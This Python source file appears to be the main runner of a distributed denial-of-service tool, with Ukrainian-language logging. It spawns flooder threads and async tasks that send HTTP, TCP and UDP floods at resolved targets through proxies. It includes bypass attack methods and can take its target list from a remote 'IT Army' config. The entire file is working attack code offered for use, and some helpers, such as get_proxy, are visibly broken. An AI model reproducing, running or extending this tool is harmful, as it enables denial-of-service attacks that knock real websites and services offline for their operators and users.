import asyncio
from contextlib import suppress

# @formatter:off
import colorama; colorama.init()
# @formatter:on
from itertools import cycle
from queue import SimpleQueue
import random
import time
from threading import Event, Thread
from typing import Any, Generator, List

from src.cli import init_argparse
from src.concurrency import DaemonThreadPool
from src.core import (
    logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED,
    DNS_WORKERS, Params, Stats, PADDING_THREADS
)
from src.dns_utils import resolve_all_targets
from src.mhddos import main as mhddos_main, async_main as mhddos_async_main
from src.output import show_statistic, print_banner, print_progress
from src.proxies import update_proxies, wrap_async
from src.system import fix_ulimits, is_latest_version
from src.targets import Targets


def cycle_shuffled(container: List[Any]) -> Generator[Any, None, None]:
    ind = list(range(len(container)))
    random.shuffle(ind)
    for next_ind in cycle(ind):
        yield container[next_ind]


class Flooder(Thread):
    def __init__(self, switch_after: int = WORK_STEALING_DISABLED):
        super(Flooder, self).__init__(daemon=True)
        self._switch_after = switch_after
        self._queue = SimpleQueue()

    def enqueue(self, event, args_list):
        self._queue.put((event, args_list))
        return self

    def run(self):
        """
        The logic here is the following:

         1) pick up random target to attack
         2) run a single session, receive back number of packets being sent
         3) if session was "succesfull" (non zero packets), keep executing for
            {switch_after} number of cycles
         4) otherwise, go back to 1)

        The idea is that if a specific target doesn't work, the thread will
        pick another work to do (steal). The definition of "success" could be
        extended to cover more use cases.

        As an attempt to steal work happens after fixed number of cycles,
        one should be careful with the configuration. If each cycle takes too
        long (for example BYPASS or DBG attacks are used), the number should
        be set to be relatively small.

        To dealing stealing, set number of cycles to -1. Such scheduling will
        be equivalent to the scheduling that was used before the feature was
        introduced (static assignment).
        """
        while True:
            event, args_list = self._queue.get()
            event.wait()
            time.sleep(random.random())  # make sure all operations are desynchornized
            kwargs_iter = cycle_shuffled(args_list)
            while event.is_set():
                kwargs = next(kwargs_iter)
                runnable = mhddos_main(**kwargs)
                no_switch = self._switch_after == WORK_STEALING_DISABLED
                alive, cycles_left = True, self._switch_after
                while event.is_set() and (no_switch or alive):
                    try:
                        alive = runnable.run() > 0 and cycles_left > 0
                    except Exception:
                        alive = False
                    cycles_left -= 1


def run_flooders(num_threads, switch_after) -> List[Flooder]:
    threads = []
    for _ in range(num_threads):
        flooder = Flooder(switch_after)
        try:
            flooder.start()
            threads.append(flooder)
        except RuntimeError:
            break

    if not threads:
        logger.error(
            f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
        exit()

    if len(threads) < num_threads:
        logger.warning(
            f"{cl.RED}Не вдалося запустити усі {num_threads} потоків - "
            f"лише {len(threads)}{cl.RESET}")

    return threads


# XXX: need a way stop on the signal
async def async_flooder(runnables):
    while True:
        with suppress(Exception):
            await next(runnables).run()


# XXX: UDP
async def run_async_ddos(
    proxies,
    targets,
    period,
    rpc,
    http_methods,
    vpn_mode,
    debug,
    table,
    total_threads,
):
    statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
    proxies_cnt = len(proxies)

    def get_proxy():
        return random.choice()

    def register_params(params, container):
        thread_statistics = Stats()
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'event': event,
            'stats': thread_statistics,
            'proxies': proxies,
        }
        container.append(kwargs)
        if not (table or debug):
            logger.info(
                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (params.target.url.host, params.target.url.port, params.method)
            )

    async def stats_printer():
        refresh_rate = 5
        ts = time.time()
        while True:
            await asyncio.sleep(refresh_rate)
            passed = time.time() - ts
            ts = time.time()
            show_statistic(statistics, refresh_rate, table, vpn_mode, proxies_cnt, period, passed)
    
    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    #if not (table or debug):
    #    # Keep the docs/info on-screen for some time before outputting the logger.info above
    #    time.sleep(5)

    for target in targets:
        assert target.is_resolved, "Unresolved target cannot be used for attack"
        # udp://, method defaults to "UDP"
        if target.is_udp:
            register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
        # Method is given explicitly
        elif target.method is not None:
            register_params(Params(target, target.method), kwargs_list)
        # tcp://
        elif target.url.scheme == "tcp":
            register_params(Params(target, 'TCP'), kwargs_list)
        # HTTP(S), methods from --http-methods
        elif target.url.scheme in {"http", "https"}:
            for method in http_methods:
                register_params(Params(target, method), kwargs_list)
        else:
            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")

    tasks = []
    runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
    for _ in range(total_threads):
        tasks.append(asyncio.ensure_future(async_flooder(runnables_iter)))

    tasks.append(asyncio.ensure_future(stats_printer()))

    await asyncio.gather(*tasks)


async def start(args):
    print_banner(args.vpn_mode)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    if args.itarmy:
        targets_iter = Targets([], IT_ARMY_CONFIG_URL)
    else:
        targets_iter = Targets(args.targets, args.config)

    proxies = []
    is_old_version = not is_latest_version()

    # padding threads are necessary to create a "safety buffer" for the
    # system that hit resources limitation when running main pools.
    # it will be deallocated as soon as all other threads are up and running.
    #padding_threads = DaemonThreadPool(PADDING_THREADS).start_all()
    dns_executor = DaemonThreadPool(DNS_WORKERS).start_all()

    # XXX: periodic updates
    if True:
        if is_old_version:
            print(
                f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')

        while True:
            targets = list(targets_iter)
            if not targets:
                logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
                exit()

            targets = resolve_all_targets(targets, dns_executor)
            targets = [target for target in targets if target.is_resolved]
            if targets:
                break
            else:
                logger.warning(
                    f'{cl.RED}Не знайдено жодної доступної цілі - чекаємо 30 сек до наступної перевірки{cl.RESET}')
                time.sleep(30)

        if args.rpc < LOW_RPC:
            logger.warning(
                f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перепідключень{cl.RESET}'
            )

        no_proxies = args.vpn_mode or all(target.is_udp for target in targets)
        if no_proxies:
            proxies = []
        else:
            proxies = list(update_proxies(args.proxies, proxies))

        proxies = list(wrap_async(proxies))

        period = 300
        await run_async_ddos(
            proxies,
            targets,
            period,
            args.rpc,
            args.http_methods,
            args.vpn_mode,
            args.debug,
            args.table,
            args.threads,
        )


# XXX: try uvloop when available
if __name__ == '__main__':
    try:
        asyncio.run(start(init_argparse().parse_args()))
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
